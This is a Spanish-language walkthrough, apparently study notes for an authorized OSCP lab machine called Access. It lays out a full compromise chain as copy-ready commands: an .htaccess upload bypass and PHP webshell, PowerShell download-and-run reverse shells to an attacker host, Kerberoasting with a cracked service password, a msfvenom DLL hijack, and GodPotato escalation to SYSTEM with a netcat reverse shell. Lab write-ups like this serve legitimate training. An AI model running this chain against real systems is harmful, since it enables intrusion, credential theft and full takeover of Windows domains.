Máquina Access — walkthrough de inicio a fin

Apuntes de estudio de la máquina Access (laboratorio autorizado OSCP/PEN-200). Web con upload vulnerable → RCE → Kerberoasting en el dominio access.offsec → cadena de privesc hasta NT AUTHORITY\SYSTEM. Cada paso dice qué hace y por qué, con el comando listo para copiar.

Esta máquina enseña la regla de oro del privesc en Windows: verifica cada paso con un archivo de prueba antes de asumir que un exploit funcionó, y cuando una herramienta "oficial" existe para un abuso de ACL, úsala en vez de un script casero — la propagación de permisos es justo donde se atasca la gente.

00Resumen de la máquina

Access es un host Windows que hace de Domain Controller del dominio access.offsec (hostname SERVER). Expone una web Apache/PHP con una función de tickets que permite subir archivos. De ahí sale todo.

Windows / Active Directory Apache 2.4.48 + PHP 8.0.7 File upload bypass Kerberoasting SeManageVolumePrivilege DLL hijacking SeImpersonate / GodPotato
Cómo leer estas notas: cada sección es un eslabón de la cadena. El botín de cada paso (una shell, una credencial, un privilegio) te habilita el siguiente. Si repites la máquina, usa el mapa para saber dónde estás.

P1Paso 1 · Reconocimiento

Objetivo: mapear puertos y descubrir la superficie web. Un escaneo completo revela un Windows con AD y una web en 80/443.

Escaneo de puertos

Por qué full port scan: los puertos interesantes de AD y servicios no siempre están en el top-1000. Escanea los 65535 primero, luego lanza scripts/versión sólo sobre los abiertos.

nmap -p- --min-rate 2000 -Pn $IP -oN nmap-full.txt
nmap -p 80,443,88,135,139,389,445,464,636,3268,5985 -sCV $IP -oN nmap-svc.txt
# resultado: Windows AD (DC) + web Apache 2.4.48 / PHP 8.0.7 en 80 y 443

Enumeración web

Por qué: la web es la única puerta sin credenciales. whatweb identifica el stack; feroxbuster busca rutas y ficheros ocultos. Aquí aparece Ticket.php, una página con un formulario de subida de archivos.

whatweb http://$IP
feroxbuster -u http://$IP -x php,html,txt -t 50
# hallazgo clave: /Ticket.php  → formulario de upload (campo the_file, multipart)
Botín: Ticket.php acepta subir archivos. Siguiente: evadir el filtro de extensión.

P2Paso 2 · Foothold vía file upload bypass

Señal: hay un upload pero filtra extensiones (no deja .php). Técnica: subir primero un .htaccess que le diga a Apache que trate una extensión arbitraria como PHP, luego subir el webshell con esa extensión.

Por qué funciona el truco del .htaccess

El filtro bloquea .php, pero Apache decide qué es "código PHP" por su configuración, no por el nombre. Un .htaccess en la carpeta de uploads con AddType hace que Apache ejecute como PHP cualquier archivo con la extensión que elijas (aquí .evil). El filtro no conoce .evil, así que lo deja pasar.

1) Subir el .htaccess

# contenido del archivo .htaccess
AddType application/x-httpd-php .evil

Súbelo por el mismo formulario de Ticket.php (campo the_file, multipart). Queda en /uploads/, que tiene directory listing abierto — útil para confirmar que el archivo llegó.

2) Subir el webshell

# contenido de shell.evil
<?php system($_GET["cmd"]); ?>

3) Confirmar RCE

Llama al webshell pasando el comando por el parámetro cmd. Si Apache devuelve la salida de whoami, tienes ejecución remota de comandos.

curl "http://$IP/uploads/shell.evil?cmd=whoami"
# → access\svc_apache   (RCE confirmado)
Verificación: entra a http://$IP/uploads/ en el navegador para ver el listado y confirmar que .htaccess y shell.evil se subieron antes de pelearte con por qué "no ejecuta".
Botín: RCE como access\svc_apache. Siguiente: pasar de webshell a una shell interactiva.

P3Paso 3 · Reverse shell como svc_apache

Por qué: un webshell por GET es incómodo. Quieres una shell interactiva. Como nishang no estaba disponible, se usa un reverse shell TCP de PowerShell servido desde Kali y disparado por el webshell.

1) Listener en Kali

nc -lvnp 443

2) Servir el script de reverse shell

Pon el .ps1 (un reverse shell TCP de PowerShell) en un directorio y levanta un servidor HTTP para que el objetivo lo descargue en memoria.

python3 -m http.server 80   # desde la carpeta con revshell.ps1

3) Disparar desde el webshell

Por qué IEX(DownloadString): descarga y ejecuta el script en memoria, sin tocar disco. Se lanza a través del parámetro cmd del webshell, URL-encodeado.

# comando que ejecuta el webshell (vía ?cmd=...)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$KALI/revshell.ps1')"
Botín: shell interactiva como access\svc_apache. Siguiente: moverse en el dominio con Kerberoasting.

P4Paso 4 · Kerberoasting

Posición: shell de una cuenta de dominio (svc_apache). Idea: cualquier usuario autenticado puede pedir tickets de servicio (TGS) de cuentas con SPN; ese ticket va cifrado con el hash de la contraseña de la cuenta de servicio, así que se puede crackear offline.

1) Encontrar cuentas con SPN

setspn es nativo de Windows — no levanta sospechas y no necesita subir nada. Busca SPNs en todo el dominio.

setspn -T access.offsec -Q */*
# → MSSQLSvc/DC.access.offsec  asociado a la cuenta MSSQL (svc_mssql)

2) Pedir el hash con Rubeus

Baja Rubeus.exe con certutil y pide el roast. /nowrap deja el hash en una sola línea para copiarlo limpio.

# en el objetivo
certutil -urlcache -f http://$KALI/Rubeus.exe C:\ProgramData\Rubeus.exe
C:\ProgramData\Rubeus.exe kerberoast /nowrap
# → hash $krb5tgs$23$...

3) Crackear con hashcat

Modo 13100 = Kerberos 5 TGS-REP etype 23. Con rockyou cae rápido porque la contraseña es débil.

hashcat -m 13100 kerb_hash.txt /usr/share/wordlists/rockyou.txt
# → svc_mssql : trustno1
Dato para el examen: si certutil da errores de WinHTTP (ver troubleshooting), usa curl.exe o Invoke-WebRequest para bajar Rubeus.exe.
Botín: credenciales svc_mssql : trustno1. Siguiente: conseguir una shell real como ese usuario.

P5Paso 5 · Shell real como svc_mssql

Problema: tienes credenciales válidas pero no puedes usarlas como esperas. Hay que elegir bien la herramienta.

Por qué WinRM no sirve aquí

evil-winrm falla con WinRMAuthorizationError: svc_mssql no está en el grupo Remote Management Users, así que no tiene permiso de WinRM. netexec winrm lo confirma (no sale Pwn3d!). En cambio netexec smb sí autentica — las credenciales son correctas, el problema es el canal.

netexec smb  $IP -u svc_mssql -p 'trustno1'   # [+] autentica
netexec winrm $IP -u svc_mssql -p 'trustno1'  # sin Pwn3d! → WinRM cerrado

La solución: Invoke-RunasCs.ps1 con -Remote

El binario RunasCs.exe fallaba por el logon type / UAC con una cuenta de dominio limitada. El script Invoke-RunasCs.ps1 (de antonioCoco/RunasCs) con -Remote es más fiable: crea el proceso como svc_mssql y te devuelve una reverse shell interactiva real. Se lanza desde la shell que ya tienes de svc_apache.

# listener en Kali
nc -lvnp 443

# cargar y ejecutar el script desde la shell de svc_apache
IEX(New-Object Net.WebClient).DownloadString('http://$KALI/Invoke-RunasCs.ps1')
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote $KALI:443
Botín: reverse shell cmd.exe autenticada como access\svc_mssql. Siguiente: escalar privilegios locales.

P6Paso 6 · Privesc con SeManageVolumePrivilege

Señal: whoami /priv como svc_mssql muestra SeManageVolumePrivilege. Aunque figura Disabled, el exploit lo habilita él mismo. Este privilegio permite reescribir ACLs y acaba otorgando control total sobre C:\.

1) Confirmar el privilegio

whoami /priv
# SeManageVolumePrivilege ... Disabled  (el exploit lo habilita solo)

2) Elegir un directorio escribible

Gotcha importante: C:\Windows\Temp no era escribible para svc_mssql (permission denied). Trabaja desde C:\ProgramData, que sí lo es. Verifica siempre con un archivo de prueba antes de subir el exploit.

echo test > C:\ProgramData\poc.txt && dir C:\ProgramData\poc.txt
# si el dir lo lista, la carpeta es escribible

3) Ejecutar el exploit oficial

Por qué el exploit oficial y no un script casero: la herencia de ACL puede estar bloqueada en subcarpetas protegidas. Un script casero de ACL sobre C:\ puede no propagarse a System32. El exploit oficial (CsEnox/SeManageVolumeExploit) sí logra la propagación recursiva.

certutil -urlcache -f http://$KALI/SeManageVolumeExploit.exe C:\ProgramData\SeManageVolumeExploit.exe
C:\ProgramData\SeManageVolumeExploit.exe
# → "Entries changed: 927, DONE"  = FullControl para BUILTIN\Users sobre C:\
Qué consigues: BUILTIN\Users obtiene FullControl recursivo sobre C:\, propagándose a C:\Windows\System32. Ahora puedes escribir DLLs en System32, lo que habilita el siguiente paso.
Botín: escritura en C:\Windows\System32. Siguiente: DLL hijacking.

P7Paso 7 · DLL hijacking → NETWORK SERVICE

Idea: algunos binarios del sistema intentan cargar una DLL que normalmente no existe. Si puedes escribir esa DLL (gracias al paso 6), el binario la cargará con el contexto de quien lo ejecute.

Por qué tzres.dll + systeminfo

systeminfo.exe carga C:\Windows\System32\wbem\tzres.dll, un archivo que suele estar ausente o es reemplazable. Al colocar ahí una DLL maliciosa y ejecutar systeminfo, Windows carga nuestra DLL y obtenemos ejecución como nt authority\network service.

1) Generar la DLL maliciosa (en Kali)

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f dll -o tzres.dll

2) Colocarla y disparar

# listener en Kali
nc -lvnp 4444

# en el objetivo: copiar la DLL a la ruta que systeminfo busca
copy C:\ProgramData\tzres.dll C:\Windows\System32\wbem\tzres.dll
systeminfo
# → reverse shell como nt authority\network service
Botín: shell como nt authority\network service. Siguiente: de NETWORK SERVICE a SYSTEM con SeImpersonate.

P8Paso 8 · Privesc final a SYSTEM con GodPotato

Señal: whoami /priv como NETWORK SERVICE muestra SeImpersonatePrivilege: Enabled. Ese privilegio es la puerta directa a SYSTEM mediante los "potatoes".

Por qué GodPotato

Las cuentas de servicio (NETWORK SERVICE, LOCAL SERVICE, cuentas de IIS/MSSQL) suelen tener SeImpersonatePrivilege. GodPotato abusa de él forzando a un servicio privilegiado a autenticarse y suplantando su token para ejecutar como SYSTEM. Funciona en un rango amplio de versiones de Windows donde JuicyPotato ya no.

whoami /priv
# SeImpersonatePrivilege ... Enabled  → vía directa a SYSTEM

certutil -urlcache -f http://$KALI/GodPotato-NET4.exe C:\ProgramData\GodPotato-NET4.exe
C:\ProgramData\GodPotato-NET4.exe -cmd "cmd /c whoami"
# → nt authority\system
Para una shell completa: en vez de whoami, pásale un comando que lance una reverse shell como SYSTEM, p. ej. -cmd "cmd /c C:\ProgramData\nc.exe $KALI 5555 -e cmd.exe".
Botín: ejecución como nt authority\system. Siguiente: leer la prueba.

P9Paso 9 · Proof

Como SYSTEM lees cualquier archivo, incluida la prueba del Administrador. En el OSCP, captura whoami + ipconfig + el contenido del proof en la misma pantalla.

type C:\Users\Administrator\Desktop\proof.txt
# → b67c5aeb8573218e3bfbc7e9928d4150
Máquina completa. Cadena: web upload → svc_apache → Kerberoasting → svc_mssql → SeManageVolume → DLL hijack → NETWORK SERVICE → GodPotato → SYSTEM.

TRTroubleshooting / gotchas

Los puntos donde esta máquina se atasca de verdad. Ténlos a mano para no repetir el bloqueo.

1 · La herencia de ACL puede estar bloqueada

Si un exploit/script de ACL sobre C:\ no "baja" a subcarpetas protegidas como System32, no es que falle: la herencia está cortada. Usa el exploit oficial (que fuerza la propagación recursiva) en vez de un script casero, o apunta el exploit directamente al subdirectorio que necesitas.

2 · RunasCs.exe (binario) falla con cuentas de dominio limitadas

Errores de logon type / UAC al usar el binario. Cambia al script Invoke-RunasCs.ps1 con -Remote: es más fiable para obtener una sesión interactiva real con una cuenta de dominio restringida.

3 · No todas las carpetas "estándar" son escribibles

C:\Windows\Temp no era escribible para svc_mssql. Si una herramienta falla al escribir ahí, prueba C:\ProgramData u otra carpeta. No asumas que Temp siempre funciona.

echo test > C:\ProgramData\poc.txt && dir C:\ProgramData\poc.txt
# confirma que puedes escribir ANTES de subir el exploit

4 · certutil da errores de WinHTTP engañosos

Un error WinHTTP ... 12004 de certutil suele ser de permisos de escritura, no de red. Si falla, no asumas que la red está rota: prueba con curl.exe nativo o Invoke-WebRequest para ver el error real, y escribe a una carpeta donde tengas permisos.

curl.exe -o C:\ProgramData\tool.exe http://$KALI/tool.exe
# o: Invoke-WebRequest http://$KALI/tool.exe -OutFile C:\ProgramData\tool.exe

5 · Verifica cada escritura con un archivo de prueba

Antes de asumir que un exploit de privilegios funcionó, confirma que la escritura realmente llegó a donde se necesita. Un echo test > ruta\poc.txt seguido de dir te ahorra horas persiguiendo un exploit que fallaba sólo por permisos de carpeta.

LCLecciones clave

  • Upload bypass por configuración, no por nombre: si filtran .php, un .htaccess con AddType convierte cualquier extensión en ejecutable. Comprueba que la carpeta de uploads permite .htaccess.
  • Kerberoasting sólo necesita una credencial de dominio. setspn (nativo) + Rubeus + hashcat -m 13100. Contraseñas de servicio débiles caen con rockyou.
  • Credenciales válidas ≠ cualquier canal. WinRM exige pertenecer a Remote Management Users. Si falla, SMB confirma que la credencial sirve y usas Invoke-RunasCs -Remote para la shell.
  • La cadena de privesc es una escalera de cuentas de servicio: SeManageVolume (ACL sobre C:\) → DLL hijack (NETWORK SERVICE) → SeImpersonate/GodPotato (SYSTEM).
  • Herramienta oficial > script casero cuando el abuso depende de propagación de ACLs.
  • Verifica, no asumas. La mayoría de los "el exploit no funciona" de esta máquina eran permisos de carpeta o herencia de ACL, no el exploit en sí.
